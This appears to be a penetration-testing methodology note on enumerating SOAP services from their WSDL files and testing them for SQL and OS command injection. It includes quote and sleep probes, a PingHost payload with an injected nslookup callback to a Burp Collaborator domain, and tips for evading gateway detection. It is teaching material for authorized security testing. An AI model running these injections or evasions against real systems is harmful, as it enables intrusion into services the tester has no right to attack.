# WSDL Enumeration and Injection Testing Methodology

## Part A: WSDL Enumeration

### 1. Goal

Turn a WSDL file into a complete, testable inventory: every operation, every parameter, every data type, and the real endpoint URL — before writing a single test request. Skipping this step and testing only the operations visible in a client application's UI is the single most common way testers miss high-impact SOAP findings, because WSDLs routinely define more operations than any client actually calls.

### 2. Manual Extraction Workflow

1. **Retrieve the raw WSDL.** `GET` the `?wsdl` URL directly (file 1, section 3.1). Save the raw XML — you'll reference it constantly.
2. **List every `<operation>` under `<portType>`** (SOAP 1.1) or `<interface>` (WSDL 2.0/SOAP 1.2). This is your full method inventory. Piece by piece, for each operation entry:
   ```xml
   <operation name="DeleteUserAccount">
     <input message="tns:DeleteUserAccountRequest"/>
     <output message="tns:DeleteUserAccountResponse"/>
   </operation>
   ```
   The `name` attribute is the literal operation name you'll place inside `<soapenv:Body>` when calling it. Cross-reference every operation name here against what the client application's UI actually exposes — any operation present in the WSDL but absent from the UI (`DeleteUserAccount`, `ResetAllPasswords`, `ExportUserData`, `DebugMode`) is a priority target: functionality that exists and is callable, but was never intended to be reachable by a normal user, often meaning it also never received the same access-control scrutiny as the "real" UI-driven operations.
3. **Trace each operation's `<message>` back to its `<types>` schema definition** to extract exact parameter names and types (file 1, section 3.2). Build a table per operation: parameter name, XSD type, `minOccurs`/`maxOccurs` (is it optional? repeatable?), and any embedded documentation/annotation the WSDL author left in `<xsd:annotation>` blocks (developers sometimes leave surprisingly candid comments here — internal notes, deprecated-but-still-functional flags, TODOs referencing known issues).
4. **Extract the real endpoint URL** from `<service><port><soap:address location="...">`. Confirm it matches the host you're actually testing against; note any internal hostnames or alternate endpoints (file 1, section 3.2's ESB/gateway note) as separate recon leads worth investigating (potential SSRF targets, potential direct-to-backend access bypassing the gateway entirely if reachable).
5. **Note the SOAPAction value** for every operation, from `<binding><operation><soap:operation soapAction="...">` — you'll need it in the HTTP header for every crafted request (file 1, section 4).
6. **Build one template request per operation**, mirroring the WSDL's exact element names, namespaces, and structure. Keep these as your base templates in Burp Repeater or SoapUI (file 5) — every subsequent injection test (XXE, SOAP injection, SQLi, command injection) starts by modifying a known-good template rather than hand-building envelopes from scratch each time, which reduces false negatives caused by malformed baseline requests.

### 3. Converting WSDL to a Testable Format

Manually crafting raw XML envelopes in Burp Repeater for every operation on a large WSDL (enterprise WSDLs routinely define 50–200+ operations) doesn't scale. Two conversion paths:

- **SoapUI project import** — SoapUI natively parses a WSDL URL and auto-generates a full request template for every operation, with parameter fields already scaffolded from the schema. This is the primary recommended path — full workflow in file 5.
- **wsdl2postman conversion** — converts WSDL operations into a Postman collection of pre-built XML request templates, useful if your team's existing workflow/tooling is Postman-centric or you want the requests portable outside SoapUI for scripted/automated testing. Full breakdown in file 5.

Either path gets you to the same place: a complete, pre-scaffolded set of valid request templates for every operation in the WSDL, ready for you to start injecting into individual parameters.

### 4. What "Complete" Enumeration Looks Like

Before moving to injection testing, you should be able to answer, for the entire service:
- How many operations exist, and which ones are absent from the client-facing application?
- For each operation, which parameters exist, what are their declared types, and are any optional parameters (`minOccurs="0"`) that the client UI never populates but the schema still accepts?
- Does the WSDL reference any nested/imported WSDL or XSD files (`<xsd:import>`, `<wsdl:import>`) defining additional types or operations you haven't pulled yet? Follow every import — enterprise WSDLs are frequently split across multiple files, and testers who only pull the top-level file miss entire type definitions.
- What authentication/WS-Security policy does the WSDL declare as required (file 3, section 7, step 3) versus what you can confirm is actually enforced?

---

## Part B: SQL Injection via SOAP Parameters

### 5. Mechanism

Once a SOAP request is parsed and deserialized, parameter values are business data exactly like any REST/form-based input — if the backend then concatenates that value into a SQL query without parameterization, it's exploitable exactly like classic SQLi. **The XML wrapping is irrelevant to the SQL layer** — by the time your `UserID` value reaches a `SELECT * FROM users WHERE id = '<value>'` query, the SOAP envelope has already been stripped away by the deserializer. This means every technique from your existing SQL Injection note series applies directly, unmodified, once you've identified the injectable parameter.

### 6. SOAP-Specific Considerations

- **Type coercion can mask or reveal injectability.** A parameter declared `xsd:int` in the WSDL schema may be validated/coerced to an actual integer type before reaching the query — breaking naive string-based SQLi payloads. Test string-typed (`xsd:string`) parameters first; for `xsd:int` parameters, confirm whether the schema type is actually enforced server-side (some toolkits are lax and accept non-numeric strings anyway) before ruling the parameter out.
- **Fault-based confirmation is your primary oracle**, same logic as XXE error-based detection (file 2, section 4, step 3). A single quote (`'`) in a string parameter that triggers a SQL syntax error will frequently surface as a verbose `<detail>` block in the SOAP Fault (file 1, section 2) — legacy SOAP services are particularly prone to leaking raw JDBC/ODBC exception text here, since defensive fault-sanitization was less commonly implemented in older enterprise codebases than in modern REST API error handling conventions.
- **Boolean-based and time-based blind techniques transfer directly** — construct payloads that alter the operation's normal response (different Body content, or presence/absence of a Fault) based on a true/false condition, or that introduce a measurable delay (`SLEEP()`/`WAITFOR DELAY` equivalents for the backend DBMS), exactly as in your web app SQLi notes. The only SOAP-specific step is correctly re-embedding the payload as valid XML element text — escape any literal `<`/`>`/`&` characters your payload needs as XML entities (`&lt;`, `&gt;`, `&amp;`) so the envelope itself remains well-formed and your SQLi payload isn't rejected at the XML parsing stage before it ever reaches the SQL layer.
- **Test every parameter across every operation from your enumeration table**, not just the ones visible in the client UI — this is the same "hidden operation" logic as section 2, step 2, applied to injection testing specifically. Undocumented/legacy operations frequently have weaker or entirely absent input validation compared to actively maintained, UI-linked operations.

### 7. Worked Example

WSDL schema defines `SearchProducts` with a string parameter:
```xml
<web:SearchProducts>
   <web:Keyword>laptop</web:Keyword>
</web:SearchProducts>
```

Baseline confirms normal search results. Inject a single quote:
```xml
<web:SearchProducts>
   <web:Keyword>laptop&apos;</web:Keyword>
</web:SearchProducts>
```
`&apos;` is the XML entity encoding for a literal apostrophe — required here specifically because a raw unescaped `'` character is valid inside XML element text (unlike `<`/`>`/`&`, apostrophes don't need escaping in element text per the XML spec, but many SOAP client libraries/toolkits escape it by convention anyway; use `&apos;` if you observe your raw apostrophe being stripped or mangled by an intermediate proxy/library during testing). A resulting SQL syntax error in the Fault confirms injectability; proceed with standard UNION-based, boolean-blind, or time-blind techniques from your SQLi series depending on how much the response surfaces.

---

## Part C: Command Injection via SOAP Parameters

### 8. Mechanism

Identical root cause pattern to SQLi (section 5) — a SOAP parameter value gets passed into a server-side shell command (common in legacy SOAP services wrapping older system utilities: file conversion operations, network diagnostic tools like ping/traceroute exposed as a "connectivity test" operation, report-generation operations shelling out to external binaries) without proper sanitization. Once the value crosses from the SOAP layer into the OS command layer, standard OS command injection techniques apply exactly as in your OS Command Injection note series.

### 9. SOAP-Specific Considerations

- **Operations most likely to shell out**: anything named suggestively — `PingHost`, `TraceRoute`, `ConvertFile`, `GenerateReport`, `RunDiagnostic`, `ExportToFormat`. Prioritize these from your enumeration table (section 2) before broadly testing every operation.
- **Payload delivery requires the same XML-escaping discipline as SQLi** (section 6) — command injection payloads often rely on characters (`;`, `|`, `&`, `` ` ``, `$()`) that are mostly XML-safe as element text **except** `&`, which **must** be encoded as `&amp;` or the XML parser will reject the document as malformed before your payload ever reaches the command layer. This is the single most common reason a command injection payload "doesn't work" against a SOAP parameter — it's not that the parameter is safe, it's that your raw `&` broke the XML document itself.
- **Blind command injection detection** uses the same techniques as any other blind CMDi context: time-based (`; sleep 10`), out-of-band (DNS/HTTP callback via Collaborator, e.g. `; nslookup attacker-collaborator-domain`), since SOAP Fault responses rarely echo command output directly even when the underlying injection succeeds.

### 10. Worked Example

A legacy `PingHost` diagnostic operation:
```xml
<web:PingHost>
   <web:HostName>10.0.0.5</web:HostName>
</web:PingHost>
```
Blind OOB command injection test, with the required XML entity encoding applied:
```xml
<web:PingHost>
   <web:HostName>10.0.0.5; nslookup test.burpcollaborator.net</web:HostName>
</web:PingHost>
```
Here `;` and spaces need no XML encoding as element text, so this specific payload happens to be XML-safe as written. A payload requiring `&&` instead of `;` as the command separator would need `&amp;&amp;` to remain valid XML — always check your payload for raw ampersands before sending. A resulting DNS interaction on your Collaborator listener confirms blind command injection independent of any visible response difference.

---

## 11. WAF / API Gateway Relevance

**SQLi and command injection via SOAP parameters**: Highly relevant, and this is where dedicated XML/SOAP gateways earn their category name — most enterprise-grade API/XML gateways bundle generic injection-pattern detection (SQL keyword blacklists, shell metacharacter detection) as a standard rule-set layered on top of their XML schema validation, applied to the *content* of Body element text regardless of the XML wrapping.

**Common detection methods:**
- Signature/regex matching for SQL keywords (`UNION`, `SELECT`, `OR 1=1`, `SLEEP(`) and shell metacharacters (`;`, `|`, `` ` ``, `$(`) within parsed element text values — applied after XML parsing/deserialization, so the detection operates on the *decoded* parameter value, not the raw XML-escaped wire representation.
- Type/format validation against the WSDL schema — a strictly-typed `xsd:int` parameter rejecting non-numeric input incidentally blocks most naive SQLi/CMDi payloads at the schema layer before any dedicated injection detection even runs.
- Behavioral/anomaly detection on response timing (catching time-based blind techniques) or unusual outbound connections (catching OOB techniques) — more common in mature enterprise SOC-monitored environments than in the gateway product itself.

**Realistic bypass considerations:**
- **XML entity encoding as an evasion layer** — since gateway injection-detection typically runs on the *decoded* value, this doesn't help evade detection the way it might against a naive raw-string WAF regex; don't rely on `&lt;`/`&amp;` encoding as an evasion technique here, only as a correctness requirement for keeping your payload valid XML in the first place.
- **Alternate SQL/shell syntax** to evade keyword blacklists — the same general evasion techniques from your SQLi and command injection note series (case variation, comment-based keyword splitting, alternate function names, encoding functions) transfer directly, since the underlying detection logic (keyword/pattern matching on decoded text) is fundamentally the same problem regardless of whether the value arrived via SOAP, REST, or a plain web form.
- **Targeting less-scrutinized legacy operations** — gateways are sometimes configured with per-operation or per-endpoint rule exceptions (common when a legacy operation was found to trigger false positives on legitimate traffic and a rule exception was added rather than fixing the underlying validation) — worth testing whether injection payloads succeed differently across different operations on the same service, since inconsistent gateway rule application across operations is a realistic and frequently-found gap.
- **Second-order injection** — if a SOAP parameter value is stored and later used in a different, internal query/command context not directly exposed to the gateway's inspection (e.g., a batch job processing stored SOAP request data hours later), gateway-layer detection on the original request is irrelevant since the injection never touches the SQL/shell layer synchronously with the inspected request. Test especially for this pattern in services with async/batch processing architectures, common in legacy enterprise systems.

---

## 12. PortSwigger Lab Mapping

No SOAP-specific SQLi/CMDi labs exist on PortSwigger — genuine gap, honestly disclosed. The underlying injection techniques, however, map completely to existing labs; only the delivery mechanism (SOAP envelope vs REST/form) differs, and this file's sections 5–10 cover that delivery gap directly.

Use your existing SQL Injection and OS Command Injection lab progressions (from your web app series) for the core technique-building — Apprentice through Expert — then apply the SOAP-specific delivery/encoding considerations from this file when translating those techniques to a SOAP target.

**Supplementary practice:** crAPI does not include SOAP endpoints (it's REST-only), so it isn't applicable here despite being your standard supplementary API practice environment for other series in this collection — worth noting explicitly since it's a departure from your usual supplementary-practice pattern. SoapUI's bundled sample services (file 5) don't include intentionally vulnerable injection points either — they're functional demo services, not deliberately vulnerable training targets. For hands-on vulnerable SOAP practice specifically, your most realistic option is standing up a deliberately vulnerable legacy SOAP service yourself (e.g., an older Apache Axis1 sample service, or a known-vulnerable version of a WordPress/Joomla-adjacent SOAP plugin in an isolated lab VM) — there is currently no maintained, purpose-built "vulnerable SOAP" training platform equivalent to DVWA/crAPI for this specific protocol, and TryHackMe's SOAP-adjacent rooms (see file 5) are closer to tooling-familiarization than dedicated vulnerable-injection practice.

---

## 13. Cross-References

- WSDL structure and `<types>` schema location: file 1, section 3.
- SOAP Fault structure used as your injection oracle: file 1, section 2.
- Full SQL injection technique library (UNION, boolean-blind, time-blind, error-based): your existing SQL Injection note series.
- Full OS command injection technique library: your existing OS Command Injection note series.
- SoapUI/wsdl2postman conversion workflow: file 5.

## Real-World Notes

- On enterprise engagements, the highest-yield enumeration finding is consistently **operations present in the WSDL but never linked from any client-facing UI** — these get tested far less often by anyone (including the original developers, during manual QA) simply because nobody clicks through to them, and they frequently retain default/legacy validation logic that was never hardened alongside the actively-used operations.
- Always pull and diff WSDL files across environments (dev/staging/prod) when you have access to more than one — staging WSDLs sometimes expose additional debug/test operations that were supposed to be removed before the production build, but weren't.
- The `&amp;` XML-escaping requirement for command injection payloads (section 9) is the most common practical mistake testers make when translating a working REST/form-based CMDi payload directly into a SOAP context — always sanity-check your payload doesn't contain a raw unescaped ampersand before sending.
